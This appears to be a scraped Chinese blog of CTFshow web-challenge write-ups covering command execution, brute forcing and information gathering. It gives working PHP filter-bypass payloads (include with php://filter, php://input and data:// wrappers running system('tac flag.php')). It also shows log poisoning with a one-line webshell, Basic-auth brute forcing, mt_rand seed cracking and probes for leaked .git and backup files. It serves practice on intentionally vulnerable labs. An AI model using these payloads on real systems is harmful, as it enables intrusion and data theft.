过滤了大部分需要用到的东西，直接给c进行传参进行命令执行现在基本上不可能了，不过可以通过特殊方法绕过\n以下是传参\n1 ?c=include%0a$_GET[1]?%3E\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php 这是什么意思呢？这里的%0a和%3E分别代表回车和\u0026gt;，可以从题目中发现题目中php源文件的尖括号并不是闭合的，以下是参考解析\n在c参数中，我们看到以下内容：\ninclude：这是一个PHP函数，用来包含并执行指定文件的内容。在正常情况下，它可以用来加载并执行PHP文件。\n%0a（换行符）：通过插入换行符，它可能会帮助跳过过滤条件，或者对PHP语法产生意外的影响。\n$_GET[1]：这是通过GET请求获取名为1的参数的值。PHP的$_GET超全局数组可以用来获取URL中的查询参数。\n?%3E（\u0026gt;）：表示HTML标签的结束符。这个符号的作用可能是结束之前的PHP代码并防止它继续执行。\n总结一下，这部分的含义是：通过include包含一个动态路径文件，并在路径中利用$_GET[1]来进一步控制要执行的文件。\n接下来使用1=php://filter/convert.base64-encode/resource=flag.php进行文件读取，将读取出的base64编码文件转为php文件即可。\n还有一种写法\n1 url/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php WEB33 命令执行，需要严格的过滤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 02:22:27 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\\u0026#34;/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 这道题和上一道题区别不大，同样可以用上一道题的payload解出。\n不过看wp后发现还有一种方法：日志注入\n1 url/?c=include$_GET[1]?%3E\u0026amp;1=../../../../var/log/nginx/access.log /var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可。\nWEB34 命令执行，需要严格的过滤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 04:21:29 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 同上，这道题多过滤了冒号，但是仍然可以直接用上上一道题的payload即可解出。\n翻wp发现这几道题还有一种思路：\n题目对常见命令都进行过滤, 但是仔细发现可以利用include进行绕过, 具体实现方式为 eval(include flag.php;); ,但是题目屏蔽了分号(;)和点号(.), 其中分号可以使用?\u0026gt;平替,但是点号无法绕过, 遂使用post执行php代码注入flag.php, 因此可得payload:\nGET：?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://input\nPOST传参：\u0026lt;?php system('tac flag.php');?\u0026gt;\n需要注意,因为POST没有按照key=value封装数据, 因此hackBar认为数据有问题, 不会发送数据, 可以使用Burp Suite发送数据\n补充: php://input默认读取没有处理过的POST数据\nWEB35 命令执行，需要严格的过滤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 04:21:23 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;|\\\u0026lt;|\\=/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 这次多过滤了等于号和\u0026lt;号，但是WEB32的payload仍然可用。因为根本没用左尖括号和等号\nWEB36 命令执行，需要严格的过滤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 04:21:16 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;|\\\u0026lt;|\\=|\\/|[0-9]/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 这次多过滤了数字，试试WEB32那个payload，欸好像不行了\u0026hellip;吗？直接把1换成字母就可以了啊oi(#`O′)！！\n看一眼wp发现一种方法和上面php://input大同小异就不解释了。\n?c=include$_GET[v]?\u0026gt;\u0026amp;v=data://text/plain,\u0026lt;?php system(\u0026quot;tac flag.php\u0026quot;)?\u0026gt;\n这题还是杂鱼，直接下一题\nWEB37 命令执行，需要严格的过滤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 05:18:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } 嗯？这道题好像不一样了，一看这不直接帮咱们include好了嘛，直接传参\n?c=data://text/plain,\u0026lt;?php system(\u0026quot;tac fla*.php\u0026quot;)?\u0026gt;\n也可以用?c=data://input然后post传参\n这里在wp里发现一种有意思的解法?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=应该可以通过这种方法绕过不少过滤。\nWEB38 命令执行，需要严格的过滤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 05:23:36 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|php|file/i\u0026#34;, $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } 这道题WEB37中base64那个payload仍然可以绕过，用php://input+post传参也可以，或者直接在WEB37原始的payload上直接小修改一下?c=data://text/plain,\u0026lt;?=system(\u0026quot;tac f*\u0026quot;)?\u0026gt;也可以直接绕过。\nWEB39 命令执行，需要严格的过滤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 06:13:21 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ include($c.\u0026#34;.php\u0026#34;); } }else{ highlight_file(__FILE__); } 同WEB37。wp有佬解释：拼接的php可以不用管，include只会处理内部的内容，对flag的过滤可以采用拼接的方式 ?c=data://text/plain，这里偷懒了，也可以base64一下。\nWEB37中的尖括号闭合可以绕过.php，因为相当于直接结束了php文件，同理也可以用//注释掉后面的内容，比如?c=data://text/plain,\u0026lt;?php%20system(\u0026quot;tac%20fla*.php\u0026quot;);//来解决这道题。\nWEB40 命令执行，需要严格的过滤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 06:03:36 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\\u0026#39;|\\\u0026#34;|\\,|\\\u0026lt;|\\.|\\\u0026gt;|\\/|\\?|\\\\\\\\/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 好家伙这是基本上把能过滤的符号全部给噶了，不过仔细一看似乎半角括号没被过滤，那应该如何尝试只用()就获取呢，上面题目（WEB31）已经有例子了，直接用?c=show_source(next(array_reverse(scandir(pos(localeconv())))));就直接绕过啦。\n这里有两种做法，分别解析：\n1.POST传参 c=eval(array_pop(next(get_defined_vars())));//需要POST传入参数为1=system(\u0026rsquo;tac fl*\u0026rsquo;);\nget_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。\nnext()将内部指针指向数组中的下一个元素，并输出。\narray_pop() 函数删除数组中的最后一个元素并返回其值。\n2.show_source c=show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c=show_source(next(array_reverse(scandir(getcwd()))));\ngetcwd() 函数返回当前工作目录。它可以代替pos(localeconv())\nlocaleconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为\u0026rdquo;.\u0026quot;\npos():输出数组第一个元素，不改变指针；\ncurrent() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样\nscandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为\u0026quot;.\u0026ldquo;所以遍历当前目录\narray_reverse():数组逆置\nnext():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以\nshow_source():查看源码\npos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。\n每个数组中都有一个内部的指针指向它的\u0026quot;当前\u0026quot;元素，初始指向插入到数组中的第一个元素。\n提示：该函数不会移动数组内部指针。\n相关的方法：\ncurrent()返回数组中的当前元素的值。\nend()将内部指针指向数组中的最后一个元素，并输出。\nnext()将内部指针指向数组中的下一个元素，并输出。\nprev()将内部指针指向数组中的上一个元素，并输出。\nreset()将内部指针指向数组中的第一个元素，并输出。\neach()返回当前元素的键名和键值，并将内部指针向前移动。\n","date":"2024-11-25T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_1/","title":"CTF_show Web 命令执行writeup P1 WEB29-WEB40"},{"content":"CTFSHOW web 爆破WriteUP WEB21 爆破什么的，都是基操\n打开环境后发现登录，然后随便输入密码用burp抓包\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 GET / HTTP/1.1 Host: f57b8182-620f-42bb-96d2-07460dab13f7.challenge.ctf.show Cache-Control: max-age=0 Authorization: Basic YWRtaW46MTIzNDU= Sec-Ch-Ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;127\u0026#34;, \u0026#34;Not)A;Brand\u0026#34;;v=\u0026#34;99\u0026#34; Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \u0026#34;Windows\u0026#34; Accept-Language: zh-CN Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Priority: u=0, i Connection: keep-alive 发现Authorization的内容是base编码，使用base64解出admin:12345，正是刚刚输入的内容。\n使用Burp的Intruder功能爆破，插入到Authorization后面\n1 Authorization: Basic §§ payload类型设置简单列表然后导入字典 然后payload处理中设置以下形式\n1 2 Add Prefix: admin: Base64-encode 不过试了几个字典都没爆出来最后没办法了直接看的答案\n账号密码分别为admin:shark63，提交请求直接获取到flag\nWEB22 域名也可以爆破的，试试爆破这个ctf.show的子域名\n这道题因为原来域名失效导致做不了了，直接给出了flag\nWEB23 还爆破？这么多代码，告辞！\n从源码中可以看出请求参数为/?token=***\n可以看出token是匹配特殊的md5格式，使用chatgpt询问并让其编写代码\n1 2 3 4 5 6 7 8 9 10 11 代码解析 include(\u0026#39;flag.php\u0026#39;);：假设 flag.php 文件中包含一个变量 $flag，其内容为我们想要获得的敏感信息。 if(isset($_GET[\u0026#39;token\u0026#39;])){：检查是否通过 GET 方法传递了 token 参数。 $token = md5($_GET[\u0026#39;token\u0026#39;]);：对 token 参数执行 md5 哈希计算，结果保存在 $token 变量中。$token 现在是一个32位的16进制字符串。 条件判断： if(substr($token, 1,1)===substr($token, 14,1) \u0026amp;\u0026amp; substr($token, 14,1) ===substr($token, 17,1))：检查 $token 字符串中第2位、第15位和第18位是否相同。substr 用于截取 $token 中的单个字符，索引从0开始，因此 substr($token, 1,1) 表示获取第二个字符。 if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))：这条语句在继续检查，如果前面的条件通过，那么它进一步验证一个数学关系： 首先，它将第2位、第15位和第18位的字符值相加并除以第2位的字符值，结果与第32位字符值相等。 这里使用 intval 将字符转换为整数值，以便执行数学运算。 echo $flag;：如果上述所有条件都满足，程序输出 $flag，即敏感信息。 highlight_file(__FILE__);：如果没有传递 token 参数，或 token 不满足条件，那么将显示当前文件的源代码。 1 2 3 4 5 6 7 8 如何找到满足条件的 token 为了获得 $flag，我们需要构造一个 token 值，使得它的 md5 哈希结果满足所有条件： 满足字符相等性条件： substr($token, 1,1), substr($token, 14,1), 和 substr($token, 17,1) 的字符必须相等。例如，可以选择一个简单的整数或字符，使得 md5 的第2位、第15位和第18位字符相同。 满足数学条件： 确保 (intval(substr($token, 1,1)) + intval(substr($token, 14,1)) + intval(substr($token, 17,1))) / substr($token, 1,1) === intval(substr($token, 31,1))。 这意味着我们需要调整 token 的值，使得 md5 哈希的第2位和第32位符号满足该数学条件。 可以使用代码或手动尝试生成一个值，使其 md5 哈希符合上述规则。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import hashlib def find_token(): for i in range(100000): # 尝试0到99999的整数作为候选 token token = str(i) # 将候选值转换为字符串 md5_hash = hashlib.md5(token.encode()).hexdigest() # 检查条件：第2位、第15位和第18位字符是否相同 if md5_hash[1] == md5_hash[14] == md5_hash[17]: # 确保第2位和第32位字符都是数字 if md5_hash[1].isdigit() and md5_hash[31].isdigit(): # 检查数学条件 if (int(md5_hash[1]) + int(md5_hash[14]) + int(md5_hash[17])) / int(md5_hash[1]) == int(md5_hash[31]): print(f\u0026#34;Found token: {token}\u0026#34;) print(f\u0026#34;MD5 hash: {md5_hash}\u0026#34;) return token # 返回符合条件的 token print(\u0026#34;No valid token found.\u0026#34;) return None # 执行程序 find_token() 这个代码虽然比较简单，但是对于这道题以及够用了，运行直接输出\n1 2 Found token: 422 MD5 hash: f85454e8279be180185cac7d243c5eb3 直接传参/?token=422获取flag\nWEB24 爆个🔨\n直接看php代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-03 13:26:39 # @Last Modified by: h1xa # @Last Modified time: 2020-09-03 13:53:31 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); include(\u0026#34;flag.php\u0026#34;); if(isset($_GET[\u0026#39;r\u0026#39;])){ $r = $_GET[\u0026#39;r\u0026#39;]; mt_srand(372619038); if(intval($r)===intval(mt_rand())){ echo $flag; } }else{ highlight_file(__FILE__); echo system(\u0026#39;cat /proc/version\u0026#39;); } ?\u0026gt; Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 虽然是随机数，但是种子都给我们了还有啥好说的，直接写个文件解出来咯\n1 2 3 4 \u0026lt;?php mt_srand(372619038); echo mt_rand(); ?\u0026gt; 解出1155388967，直接传参?r=1155388967获取到flag\nWEB25 爆个🔨，不爆了\n这道题一看感觉难了不少，虽然还是传参，但是没有前两道可以一眼丁真了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-03 13:56:57 # @Last Modified by: h1xa # @Last Modified time: 2020-09-03 15:47:33 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); include(\u0026#34;flag.php\u0026#34;); if(isset($_GET[\u0026#39;r\u0026#39;])){ $r = $_GET[\u0026#39;r\u0026#39;]; mt_srand(hexdec(substr(md5($flag), 0,8))); $rand = intval($r)-intval(mt_rand()); if((!$rand)){ if($_COOKIE[\u0026#39;token\u0026#39;]==(mt_rand()+mt_rand())){ echo $flag; } }else{ echo $rand; } }else{ highlight_file(__FILE__); echo system(\u0026#39;cat /proc/version\u0026#39;); } Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 随便传俩参发现会返回一个值，询问chatgpt分析后发现这个语句mt_srand(hexdec(substr(md5($flag), 0,8))); 用 $flag 的 MD5 散列值的前8位作为种子，设置了一个特定的随机数种子，然后把传进去的参和这个值做差，直接传个r=0直接就得出了参数?r=1570172612\n然后思路就卡死了\u0026hellip;\u0026hellip;因为并不知道开始的种子，爆破不知道要爆到什么时候\u0026hellip;..看了几个wp和提示，通过这里下载了一个爆破种子的软件，我是在Linux下编译运行的，输入第一个种子，\n1 2 3 4 \u0026lt;?php mt_srand(202568455); //爆破出的种子 echo mt_rand()+mt_rand()+mt_rand()-第一个mt_rand的值; // 由于执行了3次，而期望的值（cookie）只需要第二三个，这里减去第一个值 ?\u0026gt; 这里试了非常！非常！久！复现别人的都成功了（比如提示里那个），但是我这个每个都试了就是不行，我猜测是这个种子无解导致的，这里贴上解出来的内容和种子，希望有大佬可以解答一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ┌──(root㉿kali)-[/home/kali/桌面/233/php_mt_seed-4.0] └─# \u0026#39;/home/kali/桌面/233/php_mt_seed-4.0/php_mt_seed\u0026#39; 1570172612 Pattern: EXACT Version: 3.0.7 to 5.2.0 Found 0, trying 0xc8000000 - 0xcbffffff, speed 16777.2 Mseeds/s seed = 0xcbd7561a = 3419887130 (PHP 3.0.7 to 5.2.0) seed = 0xcbd7561b = 3419887131 (PHP 3.0.7 to 5.2.0) Found 2, trying 0xfc000000 - 0xffffffff, speed 16911.4 Mseeds/s Version: 5.2.1+ Found 2, trying 0xb2000000 - 0xb3ffffff, speed 167.2 Mseeds/s seed = 0xb38818b6 = 3012040886 (PHP 5.2.1 to 7.0.x; HHVM) Found 3, trying 0xbc000000 - 0xbdffffff, speed 166.4 Mseeds/s seed = 0xbd0e7df0 = 3171843568 (PHP 5.2.1 to 7.0.x; HHVM) Found 4, trying 0xc6000000 - 0xc7ffffff, speed 166.1 Mseeds/s seed = 0xc7d72544 = 3352765764 (PHP 5.2.1 to 7.0.x; HHVM) seed = 0xc7d72544 = 3352765764 (PHP 7.1.0+) Found 6, trying 0xd2000000 - 0xd3ffffff, speed 165.9 Mseeds/s seed = 0xd2005b5c = 3523238748 (PHP 5.2.1 to 7.0.x; HHVM) seed = 0xd2005b5c = 3523238748 (PHP 7.1.0+) Found 8, trying 0xfe000000 - 0xffffffff, speed 165.2 Mseeds/s Found 8 重开环境再次进行测试\n这次输出\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ┌──(root㉿kali)-[/home/kali/桌面/233/php_mt_seed-4.0] └─# \u0026#39;/home/kali/桌面/233/php_mt_seed-4.0/php_mt_seed\u0026#39; 1164719300 Pattern: EXACT Version: 3.0.7 to 5.2.0 Found 0, trying 0x88000000 - 0x8bffffff, speed 17551.5 Mseeds/s seed = 0x8bf3d33e = 2348012350 (PHP 3.0.7 to 5.2.0) seed = 0x8bf3d33f = 2348012351 (PHP 3.0.7 to 5.2.0) Found 2, trying 0xfc000000 - 0xffffffff, speed 17616.1 Mseeds/s Version: 5.2.1+ Found 2, trying 0x32000000 - 0x33ffffff, speed 161.9 Mseeds/s seed = 0x334a2baf = 860498863 (PHP 7.1.0+) Found 3, trying 0x84000000 - 0x85ffffff, speed 163.8 Mseeds/s seed = 0x8540cacf = 2235615951 (PHP 5.2.1 to 7.0.x; HHVM) Found 4, trying 0xa4000000 - 0xa5ffffff, speed 164.3 Mseeds/s seed = 0xa490bd69 = 2760949097 (PHP 7.1.0+) Found 5, trying 0xfe000000 - 0xffffffff, speed 165.2 Mseeds/s Found 5 使用以下代码出解\n1 2 3 4 \u0026lt;?php mt_srand(2760949097); //爆破出的种子 echo mt_rand()+mt_rand()+mt_rand()-1164719300; // 由于执行了3次，而期望的值（cookie）只需要第二三个，这里减去第一个值 ?\u0026gt; 最后get传参?r=1164719300，cookie使用Hackbartoken=1458369882直接execute拿到flagctfshow{87e05252-fe88-4767-85e1-c75fd6eb124b}\n然后不小心把容器销毁了，又要重做了呜呜呜\n不过这道题倒是做出来了\nWEB26 这个可以爆\n这道题开始还以为是爆破，结果研究了半天发现要填入的项太多了不知道怎么做，后来直接填的空参数直接连接成功了，也是非常异或啊，直接用burp重放器发送请求即可看到flag\nWEB27 CTFshow菜鸡学院招生啦！\n看到有录取名单列表，打开发现身份证被去掉了出生日期这一部分，使用下面的脚本便捷地生成生日字典\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 from datetime import datetime, timedelta def generate_birthday_dict(start_date, end_date): \u0026#34;\u0026#34;\u0026#34; 生成指定日期范围内的生日字典。 Args: start_date (str): 开始日期，格式为 \u0026#34;YYYY-MM-DD\u0026#34; end_date (str): 结束日期，格式为 \u0026#34;YYYY-MM-DD\u0026#34; Returns: dict: 生日字典，键为日期，值为空字符串（用于填写名字） \u0026#34;\u0026#34;\u0026#34; date_format = \u0026#34;%Y%m%d\u0026#34; start = datetime.strptime(start_date, date_format) end = datetime.strptime(end_date, date_format) current = start birthday_dict = {} while current \u0026lt;= end: birthday_dict[current.strftime(date_format)] = \u0026#34;\u0026#34; current += timedelta(days=1) return birthday_dict def save_birthday_dict_to_txt(birthday_dict, filename=\u0026#34;birthdays.txt\u0026#34;): \u0026#34;\u0026#34;\u0026#34; 将生日字典保存到 txt 文件中。 Args: birthday_dict (dict): 生日字典，键为日期，值为空字符串 filename (str): 输出文件名 \u0026#34;\u0026#34;\u0026#34; with open(filename, \u0026#34;w\u0026#34;) as file: for date, name in birthday_dict.items(): file.write(f\u0026#34;{date}\\n\u0026#34;) print(f\u0026#34;生日字典已保存到 {filename}\u0026#34;) # 用户输入日期范围 start_date = input(\u0026#34;请输入开始日期 (YYYYMMDD): \u0026#34;) end_date = input(\u0026#34;请输入结束日期 (YYYYMMDD): \u0026#34;) # 生成生日字典并保存 birthday_dict = generate_birthday_dict(start_date, end_date) save_birthday_dict_to_txt(birthday_dict) 生成一个1990-2010生日的字典，然后放到burp的重放器里跑一遍，发现\na=%E5%B5%87%E5%BC%80%E6%A2%A6\u0026amp;p=360730199110167653\n成功得出结果，不过是\\u的字符，找个在线网站解一下就可以了。解出账号和密码直接选择学生登录即可成功。\nWEB28 大海捞针\n这道题打开环境发现/0/1/2.txt，猜测是目录爆破，使用Burp的Intruder功能爆破，看提示后直接用/1-100/1-100扫描就可以了，不需要用别的复杂方法。\n","date":"2024-11-07T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_explosion_write_up/","title":"CTF_show Web 爆破writeup WEB21-WEB28"},{"content":"CTFSHOW web入门 信息收集WriteUP 2 3 3 C T F S H O W\n因为放图后国内网络问题导致加载速度很慢效果不佳所以从这个开始就尽量不放图片了\nWEB1 开发注释未及时删除\n进入环境直接使用F12打开控制台即可找出flag\n\u0026lt;!-- ctfshow{4fd63d59-4831-49ff-9bd6-4ee34b8e70c4} --\u0026gt;\nWEB2 js前台拦截 === 无效操作\n这道题进去以后发现F12按了没反应，右键也不行，但是可以直接通过浏览器界面打开开发者模式或者通过查看源代码绕过，flag就在注释里\n\u0026lt;!-- ctfshow{5f025258-4778-4833-95ff-1941f3ae0f6e} --\u0026gt;\nWEB3 没思路的时候抓个包看看，可能会有意外收获\n根据提示从请求头直接抓取到flag\nFlag: ctfshow{c9e9eea4-5293-47d2-8f13-219856f7d61e}\nWEB4 总有人把后台地址写入robots，帮黑阔大佬们引路。\n这道题根据提示直接访问robots.txt，获取到flag文件地址，访问即可得到flag\nWEB5 phps源码泄露有时候能帮上忙\n这道题一开始没有思路，但是看到phps文件尝试访问index.phps下载到主页的源码后直接在注释里得到flag\n//ctfshow{2b127e88-8378-410e-abe0-1f215357d8ac}\nWEB6 解压源码到当前目录，测试正常，收工\n这道题是站长太粗心直接把网站源码遗留在生产环境中，扫描目录发现www.zip，下载即可直接获得flag\nWEB7 版本控制很重要，但不要部署到生产环境更重要。\n这道题根据提示可以猜到是版本文件泄露，尝试访问/.git直接获取flag\nWEB8 版本控制很重要，但不要部署到生产环境更重要。\n嗯？难道我看错题了？不过测试发现.git这次不行了，经过搜索发现.svn也是常用的开发版本文件，尝试访问发现直接获取flag\n1 2 3 NOTE 常见文件泄露目录格式 .git .svn .DS_store .hg /CVS/* .bzr .filename.swp phpinfo.php WEB9 发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了\n这题似乎也没啥思路，不过上一题查过vim的缓存文件 .filename.swp 尝试访问index.php.swp直接获取到了flag\nWEB10 cookie 只是一块饼干，不能存放任何隐私数据\n根据提示直接抓包获取cookie内存储的的flag\nWEB11 域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息\n用好几个网站查询都不行，不知道是什么问题，可能域名有问题，访问不了了，不过大概是考nslookup这种域名解析的知识\nWEB12 有时候网站上的公开信息，就是管理员常用密码\n网站底下的帮助热线就是密码，直接使用admin账号即可登录\nWEB13 技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码\n在网站顶部看到document，点进去后看到默认密码，尝试登录直接成功\nWEB14 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人\n这道题一开始也没思路，点提示后才发现/editor是个能访问的插入编辑器，选择上传文件发现有个文件浏览，一看直接连传马都不需要了，直接找到flag所在文件打开即可\nWEB15 公开的信息比如邮箱，可能造成信息泄露，产生严重后果\n根据提示找到一个QQ邮箱，尝试/admin发现后台管理界面，尝试邮箱失败，不过发现有重置密码界面，点进去发现是我所在的城市？根据QQ邮箱的QQ直接搜到这个人是在西安，尝试后直接改掉了密码进入后台\nWEB16 对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露\n直接访问tz.php找phpinfo信息，然后直接搜索到作为flag的环境变量\nWEB17 备份的sql文件会泄露敏感信息\n直接下载backup.sql获得flag\nWEB18 不要着急，休息，休息一会儿，玩101分给你flag\n这道题是个很难的Flappy bird，玩了一会发现根本不可能过，所以F12找到js文件的通过条件的js\n1 var result=window.confirm(\u0026#34;\\u4f60\\u8d62\\u4e86\\uff0c\\u53bb\\u5e7a\\u5e7a\\u96f6\\u70b9\\u76ae\\u7231\\u5403\\u76ae\\u770b\\u770b\u0026#34;); 直接复制到控制台，弹出提示：你赢了，去幺幺零点皮爱吃皮看看\n根据谐音访问110.php直接获取flag\nWEB19 密钥什么的，就不要放在前端了\n这道题密钥前端验证，可以直接从前端找到判断的js代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function checkForm(){ var key = \u0026#34;0000000372619038\u0026#34;; var iv = \u0026#34;ilove36dverymuch\u0026#34;; var pazzword = $(\u0026#34;#pazzword\u0026#34;).val(); pazzword = encrypt(pazzword,key,iv); $(\u0026#34;#pazzword\u0026#34;).val(pazzword); $(\u0026#34;#loginForm\u0026#34;).submit(); } function 